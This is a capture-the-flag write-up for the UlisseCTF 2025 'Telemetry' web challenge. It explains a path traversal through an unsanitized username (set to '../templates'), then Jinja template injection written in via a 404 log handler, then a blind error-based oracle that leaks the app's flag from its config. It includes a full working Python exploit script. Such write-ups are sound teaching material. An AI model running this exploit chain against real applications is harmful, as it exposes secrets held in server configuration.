---
title: Ulisse2025 | Telemetry
published: 2025-04-08
description: Elia has just developed a brand-new website to analyze logs at runtime 🧻. Confident in his security skills, he bet his entire house that you won't find the hidden flag... Will you prove him wrong? 🏠🔍
image: ''
tags: ["web"]
authors: ["akiidjk"]
solves: 14
points: 280
firstblood: false
category: Ulisse2025
draft: false

---





## Introduction

Fourth round of the Cybercup 2025 ulisseCTF I want to show the writeup of the first web, a really interesting challenge.

## Source

The application is a simple Flask app with 0 css (we almost like it).

**We have 3 main pages:**

- index.html
![alt text](/images/telemetry/image1.png)
- check.html
![alt text](/images/telemetry/image2.png)
- upload.html
![alt text](/images/telemetry/image3.png)

The thing that stands out is the way the logs are stored, in fact we see that a folder and a file are created for each individual user where the logs are stored, the challenge also refers to the logs so there is likely a related vulnerability, and finally it gives us the ability to run one of the rendered templates that we have in the templates folder, which *NORMALLY* are just the three html files listed above.

```python
# filename: app.py

@app.route('/login', methods=['POST'])
def login():
    username = request.form['user']
    log_file = request.form['log']

    if len(log_file) != 32:
        flash('Invalid log filename length', 'danger')
        return redirect('/')

    user_id = str(uuid.UUID(log_file))
    log_file = user_id + '.txt'

    if os.path.exists(os.path.join('logs', username, log_file)):
        flash('User/Log already exists', 'danger')
        return redirect('/')

    session['user'] = (user_id, username)
    session['files'] = MAX_FILES

    os.makedirs(os.path.join('logs', username), exist_ok=True)
    with open(os.path.join('logs', username, log_file), 'w') as f:
        f.write(f'[{time.time()}] - Log file: {user_id}.txt\n')
        f.write(f'[{time.time()}] - User logged in\n')

    return redirect('/upload')
```

To begin the analysis, let us first understand how the login takes place...

We see that the username and the log_file name are taken from the form, the length of the log_file is checked, which must be 32 (number of UUIDv4 characters excluding the "-"), the log file is created, everything is entered into the session, and finally the logs are written to the file The things that stand out are 2 - The username is not sanitized - The username is used in the creation of the path, which is created insecurely

```python
# filename: app.py
@app.route('/check', methods=['GET', 'POST'])
def check():
    if request.method == 'GET':
        return render_template('check.html')

    template = secure_filename(request.form['template'])
    if not os.path.exists(os.path.join('templates', template)):
        flash('Template not found', 'danger')
        return redirect('/check')
    try:
        render_template(template)
        flash('Template rendered successfully', 'success')
    except:
        flash('Error rendering template', 'danger')
    return redirect('/check')

@app.errorhandler(404)
def page_not_found(e):
    if user := session.get('user', None):
        if not os.path.exists(os.path.join('logs', user[1], user[0] + '.txt')):
            session.clear()
            return 'Page not found', 404
        with open(os.path.join('logs', user[1], user[0] + '.txt'), 'a') as f:
            f.write(f'[{time.time()}] - Error at page: {unquote(request.url)}\n')
        return redirect('/')
    return 'Page not found', 404
```

Now let us look at two more basic elements, the check function and this 404 handler The check function has nothing wrong or broken, so we don't care so much, the only interesting thing we see is that the template that is rendered is not returned, so we won't be able to see the output easily Instead an interesting thing we see is this 404 handler that logs the file when it is called and also writes the path we entered and that triggered it.

## Solution

Well, the solution is really interesting because the main vulnerability is that we can give the user any name and that name is not sanitized THEN... we can give our user the name `../templates`.

It may seem trivial, but this allows us to render our log file as a template... Next problem: how do we write arbitrary templates to the log file?

VERY SIMPLY via the 404 handler, which allows us to write whatever we want in the /endpoint that is returned in the file Well then, we just need to make a request to `http://HOST/{config["FLAG"]}` and get the flag, right?

Well no, remember that unfortunately the output is not returned when rendering the template... Well, just send the output somewhere or run a shell? Well, neither, because unfortunately there is a very robust sandbox that doesn't allow us to do almost anything.

```python
# filename: file.py

class JinjaEnvironment(SandboxedEnvironment):
    # Simply wraps jinja's sandboxed environment so that it can be used with flask
    def __init__(self, app: Flask, **options) -> None:
        if "loader" not in options:
            options["loader"] = app.create_global_jinja_loader()
        SandboxedEnvironment.__init__(self, **options)
        self.app = app

app.jinja_environment = JinjaEnvironment
Session(app)
```

So how do we leak the value?

Well we can take inspiration from blind error based SQLi in this case and our script would look something like this

```python
#filename: exploit.py
import random
import string
import os
import requests
import uuid

# BASE_URL = "http://telemetry.challs.ulisse.ovh:6969/"
BASE_URL = "http://localhost:6969"

s = requests.Session()

def login(username,logfile):
    r = s.post(BASE_URL + "/login", data={"user": username,"log": logfile})
    if r.status_code != 200:
        print("Login failed")
        print("Error:", r.text)

def trigger404(payload):
    r = s.get(BASE_URL + f"/{payload}")
    if r.status_code != 200:
        print("Trigger failed")
        print("Error:", r.text)
        print("Status Code:", r.status_code)

def trigger_template_render(user_id):
    data = {"template": user_id + ".txt"}
    r = s.post(BASE_URL + "/check", data=data)
    if "green" in r.text:
        return True
    else:
        return False

def restart():
    s.cookies.clear()
    username = "../templates"
    log = os.urandom(16).hex()
    user_id = str(uuid.UUID(log))
    login(username, log)
    return user_id

def exploit():
    alphabet = string.digits + "!_{}" + string.ascii_letters
    flag = ""
    user_id = restart()
    for index in range(len(flag),40):
        print(f"Index: {index}")
        for letter in alphabet:
            payload = f"{{{{ config['FLAG'][{index}] if config['FLAG'][{index}] == '{letter}' else 1/0 }}}}"
            trigger404(payload)
            res = trigger_template_render(user_id)
            if res:
                flag += letter
                print(f"Flag: {flag}")
                if letter == "}":
                    print("Flag found!")
                    return
                user_id = restart()
                break
            else:
                user_id = restart()
                continue

    print(f"Flag: {flag}")

def main():
    exploit()

if __name__ == "__main__":
	main()


# goodluck by @akiidjk
```

flag: :spoiler[UlisseCTF{n3x7_T1m3_st1ck_t0_your_l0g5!}]
